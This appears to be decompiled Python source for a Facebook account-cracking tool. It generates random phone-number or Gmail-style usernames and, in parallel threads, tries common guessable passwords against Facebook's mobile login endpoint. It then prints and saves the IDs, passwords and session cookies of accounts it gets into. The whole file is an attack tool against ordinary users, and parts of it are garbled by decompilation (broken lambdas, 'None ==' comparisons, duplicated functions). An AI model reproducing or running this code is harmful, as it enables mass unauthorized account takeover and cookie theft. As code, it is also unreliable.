    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100085482740170/')
        bd()
        return None
    if None == '3':
        chos()
        return None
    if None == '4':
        gmail()
        return None
    if None == '0':
        print('[•] THANKS FOR USE ')
        time.sleep(3)
        exit()
        return None
    None('[•] CHOOSE CORRECT OPTION')
    time.sleep(2)
    AHMED()


def menu():
    os.system('clear')
    print(logo)
    print('[1]  7 DIGIT CRACKER(lock id)')
    print('[2]  AUTO PASS CRACKER(justnow open')
    print('[3] AHMED  + BALOCH PASS')
    print('[4] BEST FOR PUBG IDS')
    print('[5] BEST FOR FREE FIRE IDS')
    print('[0] EXIT TO MAIN MENU')
    lines()
    opt = input('[•] CHOOSE: ')
    if opt == '1':
        svn_digit()
        return None
    if None == '2':
        ali_khan()
        return None
    if None == '3':
        malik_baloch()
        return None
    if None == '4':
        pubg()
        return None
    if None == '5':
        ff()
        return None
    if None == '0':
        SIALZADA()
        return None
    None('\n\x1b[1;37m[•] Choose valid option\x1b[0;97m')
    time.sleep(2)
    menu()

import os
print('First Join My Fb Group')
os.system('xdg-open https://www.facebook.com/profile.php?id=100085482740170/')

def svn_digit():
    user = []
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
    lines()
    kode = input('[•]\x1b[1;37m PUT YOUR SIM CODE : ')
    os.system('clear')
    print(logo)
    print('[•] MAX LIMIT [50000]')
    lines()
    limit = int(input('[•] ENTER LIMIT :  '))
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 70)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[•] TOTAL ACCOUNTS    : \x1b[1;32m' + tl)
        print('\x1b[1;37m[•] SELECTED CODE     : \x1b[1;32m' + kode)
        print('\x1b[1;37m[•] METHOD YOU CHOOSE : \x1b[1;32m 7 DIGIT CRACKER')
        print('\x1b[1;97m[•] USE FLIGHT [\x1b[1;32mAIRPLANE\x1b[1;37m] MODE IN EVERY 5 MINUTES')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [
                guru,
                kode + guru]
            yaari.submit(fcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('[✓] Crack process has been completed')
    print('[?] Idz saved in [ok.txt,cp.txt]')
    input('Press Enter To Go Back To Menu')
    SIALZADA()


def ali_khan():
    user = []
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
    lines()
    kode = input('[•]\x1b[1;37m PUT YOUR SIM CODE : ')
    os.system('clear')
    print(logo)
    print('[•] MAX LIMIT [50000]')
    lines()
    limit = int(input('[•] ENTER LIMIT :  '))
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 30)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[•] TOTAL ACCOUNTS    : \x1b[1;32m' + tl)
        print('\x1b[1;37m[•] SELECTED CODE     : \x1b[1;32m' + kode)
        print('\x1b[1;37m[•] METHOD YOU CHOOSE : \x1b[1;32m AUTO PASS CRACKER')
        print('\x1b[1;97m[•] USE FLIGHT [\x1b[1;32mAIRPLANE\x1b[1;37m] MODE IN EVERY 5 MINUTES')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [
                guru,
                'khankhan',
                'khan1122',
                'khan12',
                'khan123',
                'ali12345',
                'pak123',
                'khan786']
            yaari.submit(fcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('[✓] Crack process has been completed')
    print('[?] Ids saved in ok.txt,cp.txt')
    input('Press Inter To Back Menu')
    SIALZADA()


def malik_baloch():
    user = []
    os.system('clear')
    print(logo)
    print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
    lines()
    kode = input('[+]\x1b[1;37m PUT YOUR SIM CODE : ')
    os.system('clear')
    print(logo)
    print('[•] MAX LIMIT [50000]')
    lines()
    limit = int(input('[•] ENTER LIMIT :  '))
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 60)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[•] TOTAL ACCOUNTS    : \x1b[1;32m' + tl)
        print('\x1b[1;37m[•] SELECTED CODE     : \x1b[1;32m' + kode)
        print('\x1b[1;37m[•] METHOD YOU CHOOSE : \x1b[1;32m AHMED+ BALOCH')
        print('\x1b[1;97m[•] USE FLIGHT [\x1b[1;32mAIRPLANE\x1b[1;37m] MODE IN EVERY 5 MINUTES')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [
                guru,
                'malik123',
                'malik1122',
                'baloch786']
            yaari.submit(fcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('[✓] Crack process has been completed')
    print('[?] Ids saved in ok.txt,cp.txt')
    input('Press Inter To Back Menu')
    SIALZADA()


def lock(uid):
    po = str(requests.get(f'''https://graph.facebook.com/{uid}/picture?type=normal''').text)
    if 'Photoshop' in po:
        return 'Active'


def pubg():
    user = []
    os.system('clear')
    print(logo)
    print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
    lines()
    kode = input('[+]\x1b[1;37m PUT YOUR SIM CODE : ')
    os.system('clear')
    print(logo)
    print('[•] MAX LIMIT [50000]')
    lines()
    limit = int(input('[•] ENTER LIMIT :  '))
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 30)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[•] TOTAL ACCOUNTS    : \x1b[1;32m' + tl)
        print('\x1b[1;37m[•] SELECTED CODE     : \x1b[1;32m' + kode)
        print('\x1b[1;37m[•] METHOD YOU CHOOSE : \x1b[1;32mPUBG')
        print('\x1b[1;97m[•] USE FLIGHT [\x1b[1;32mAIRPLANE\x1b[1;37m] MODE IN EVERY 5 MINUTES')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [
                guru,
                'pubgqueen',
                'pubgking',
                'pubglover,pubg786, pubg123,pubghacker,"pubg12345']
            yaari.submit(fcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('[✓] Crack process has been completed')
    print('[?] Idz saved in [ok.txt,cp.txt]')
    input('Press Enter To Go Back To Menu')
    SIALZADA()


def lock(uid):
    po = str(requests.get(f'''https://graph.facebook.com/{uid}/picture?type=normal''').text)
    if 'Photoshop' in po:
        return 'Active'


def ff():
    user = []
    os.system('clear')
    print(logo)
    print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
    lines()
    kode = input('[+]\x1b[1;37m PUT YOUR SIM CODE : ')
    os.system('clear')
    print(logo)
    print('[•] MAX LIMIT [50000]')
    lines()
    limit = int(input('[•] ENTER LIMIT :  '))
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 30)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[•] TOTAL ACCOUNTS    : \x1b[1;32m' + tl)
        print('\x1b[1;37m[•] SELECTED CODE     : \x1b[1;32m' + kode)
        print('\x1b[1;37m[•] METHOD YOU CHOOSE : \x1b[1;32mFREE FIRE')
        print('\x1b[1;97m[•] USE FLIGHT [\x1b[1;32mAIRPLANE\x1b[1;37m] MODE IN EVERY 5 MINUTES')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [
                guru,
                'freefire',
                'fflover',
                'ffking',
                'ffqueen,freefire123fflove,"freefire,"ffhacker']
            yaari.submit(fcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('[✓] Crack process has been completed')
    print('[?] Idz saved in [ok.txt,cp.txt]')
    input('Press Enter To Go Back To Menu')
    SIALZADA()


def bd():
    user = []
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : 088***,88***,88****,88****,.ETC')
    lines()
    kode = input('[•]\x1b[1;37m PUT YOUR SIM CODE : ')
    os.system('clear')
    print(logo)
    print('[•] MAX LIMIT [50000]')
    lines()
    limit = int(input('[•] ENTER LIMIT :  '))
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 70)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[•] TOTAL ACCOUNTS    : \x1b[1;32m' + tl)
        print('\x1b[1;37m[•] SELECTED CODE     : \x1b[1;32m' + kode)
        print('\x1b[1;37m[•] METHOD YOU CHOOSE : \x1b[1;32mBANGLA')
        print('\x1b[1;97m[•] USE FLIGHT [\x1b[1;32mAIRPLANE\x1b[1;37m] MODE IN EVERY 5 MINUTES')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [
                guru,
                '+88',
                'bangladish']
            yaari.submit(fcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('[✓] Crack process has been completed')
    print('[?] Ids saved in ok.txt,cp.txt')
    input('Press Inter To Back Menu')
    SIALZADA()


def chos():
    user = []
    twf = []
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    print('\x1b[1;91m[•] YOUR SIM CODE: ')
    lines()
    code = input(' Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[•] MAX LIMIT [50000]')
    lines()
    limit = int(input('[•] LIMIT :  '))
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        os.system('clear')
        print(logo)
        print('[•] EXAMPLE :  1,2,3,4,5,6,7,8,9,Etc')
        lines()
        passx = int(input('[•] ENTER PASSWORD LIMIT : '))
        HamiiID = []
        os.system('clear')
        print(logo)
        print('[•] EXAMPLE : khan12345,bangladish,baloch,Etc')
        lines()
        for bilal in range(passx):
            pww = input(f'''[•] ENTER PASSWORDS {bilal + 1} : ''')
            HamiiID.append(pww)
            manshera = ThreadPool(max_workers = 70)
            os.system('clear')
            print(logo)
            tl = str(len(user))
            lines()
            for love in user:
                pwx = [
                    love[1:]]
                uid = code + love
                for Eman in HamiiID:
                    pwx.append(Eman)
                    pwx.append(love)
                    manshera.submit(fcrack, uid, pwx, tl)
                    None(None, None)
                    if not ''.join:
                        pass
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    SIALZADA()


def gmail():
    user = []
    os.system('clear')
    print(logo)
    print('[•] FIRST NAME EXAMPLE : sial,khan...etc \n[•] LAST NAME EXAMPLE : WASEEM,ayesh...etc')
    lines()
    kode = input('[•] ENTER FIRST NAME : ')
    kodex = input('[•] ENTER LAST NAME :  ')
    lines()
    print('[•] EXAMPLE : @gmail.com, @yahoo.com ')
    lines()
    doamin = input('[•] ENTER GMAIL : ')
    lines()
    limit = int(input('[•] ENTER LIMIT : '))
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(1, 4)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 30)
        os.system('clear')
        print(logo) 
        tl = str(len(user))
        print('[•] TOTAL ACCOUNTS    : \x1b[1;32m' + tl)
        print(f'''\x1b[1;37m[•] GMAIL YOU CHOOSE  : \x1b[1;32m{doamin}''')
        print('\x1b[1;37m[•] METHOD YOU CHOOSE : \x1b[1;32mGMAIL')
        print('\x1b[1;97m[•] USE FLIGHT [\x1b[1;32mAIRPLANE\x1b[1;37m] MODE IN EVERY 5 MINUTES')
        lines()
        for guru in user:
            uid = kode + kodex + guru + doamin
            pwx = [
                kode,
                kodex,
                kode + kodex,
                kode + '123',
                kode + '1234',
                kode + '12345',
                kode + guru,
                kodex + '123',
                kodex + '1234',
                kodex + '12345']
            yaari.submit(fcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    AHMED()


def chos():
    user = []
    twf = []
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    print('\x1b[1;91m[•] YOUR SIM CODE: ')
    lines()
    code = input(' Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[•] MAX LIMIT [50000]')
    lines()
    limit = int(input('[•] LIMIT :  '))
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        os.system('clear')
        print(logo)
        print('[•] EXAMPLE :  1,2,3,4,5,6,7,8,9,Etc')
        lines()
        passx = int(input('[•] ENTER PASSWORD LIMIT : '))
        HamiiID = []
        os.system('clear')
        print(logo)
        print('[•] EXAMPLE : khan12345,bangladish,baloch,Etc')
        lines()
        for bilal in range(passx):
            pww = input(f'''[•] ENTER PASSWORDS {bilal + 1} : ''')
            HamiiID.append(pww)
            manshera = ThreadPool(max_workers = 70)
            os.system('clear')
            print(logo)
            tl = str(len(user))
            lines()
            for love in user:
                pwx = [
                    love[1:]]
                uid = code + love
                for Eman in HamiiID:
                    pwx.append(Eman)
                    pwx.append(love)
                    manshera.submit(fcrack, uid, pwx, tl)
                    None(None, None)
                    if not ''.join:
                        pass
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    SIALZADA()


def gmail():
    user = []
    os.system('clear')
    print(logo)
    print('[•] FIRST NAME EXAMPLE : sial,khan...etc \n[•] LAST NAME EXAMPLE : WASEEM,ayesh...etc')
    lines()
    kode = input('[•] ENTER FIRST NAME : ')
    kodex = input('[•] ENTER LAST NAME :  ')
    lines()
    print('[•] EXAMPLE : @gmail.com, @yahoo.com ')
    lines()
    doamin = input('[•] ENTER GMAIL : ')
    lines()
    limit = int(input('[•] ENTER LIMIT : '))
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(1, 4)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 30)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[•] TOTAL ACCOUNTS    : \x1b[1;32m' + tl)
        print(f'''\x1b[1;37m[•] GMAIL YOU CHOOSE  : \x1b[1;32m{doamin}''')
        print('\x1b[1;37m[•] METHOD YOU CHOOSE : \x1b[1;32mGMAIL')
        print('\x1b[1;97m[•] USE FLIGHT [\x1b[1;32mAIRPLANE\x1b[1;37m] MODE IN EVERY 5 MINUTES')
        lines()
        for guru in user:
            uid = kode + kodex + guru + doamin
            pwx = [
                kode,
                kodex,
                kode + kodex,
                kode + '123',
                kode + '1234',
                kode + '12345',
                kode + guru,
                kodex + '123',
                kodex + '1234',
                kodex + '12345']
            yaari.submit(fcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    AHMED()


def fcrack(uid, pwx, tl):
    global loop
    for ps in pwx:
        pro = random.choice(ugen)
        session = requests.Session()
        free_fb = session.get('https://x.facebook.com').text
        log_data = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': uid,
            'pass': ps,
            'login': 'Log In' }
        header_freefb = {
            'authority': 'x.facebook.com',
            'method': 'GET',
            'scheme': '/',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro }
        lo = session.post('https://x.facebook.com//login/device-based/login/async/?refsrc', data = log_data, headers = header_freefb).text
        log_cookies = session.cookies.get_dict().keys()
        if 'c_user' in log_cookies:
            coki = (lambda .0: for key, value in .0:
[ key + '=' + value ])(session.cookies.get_dict().items()())
            cid = coki[151:166]
            print('\x1b[1;32m[AHMED-OK💚] ' + cid + '|' + ps + '\x1b[0;97m\n[‎‎🏵️]\x1b[0;93m COOKIE = \x1b[1;32m' + coki + '    \x1b[0;97m')('----------------------------------------------')
            open('AHMED-OK.txt', 'a').write(cid + ' | ' + ps + '\n')
            oks.append(cid)
            ';'.join
        if 'checkpoint' in log_cookies:
            coki = (lambda .0: for key, value in .0:
[ key + '=' + value ])(session.cookies.get_dict().items()())
            cid = coki[141:152]
            print('\x1b[1;33m[AHMED-CP] ' + cid + ' | ' + ps + '\x1b[1;97m')
            open('LOL-CP.txt', 'a').write(cid + ' | ' + ps + '\n')
            cps.append(cid)
            ';'.join
        loop += 1
        (sys.stdout.write('\r[\x1b[1;97mASRAR\x1b[1;97m] %s|\x1b[1;32mOK:- %s\r' % (loop, len(oks))),)
        sys.stdout.flush()
        return None
        return None

Main()
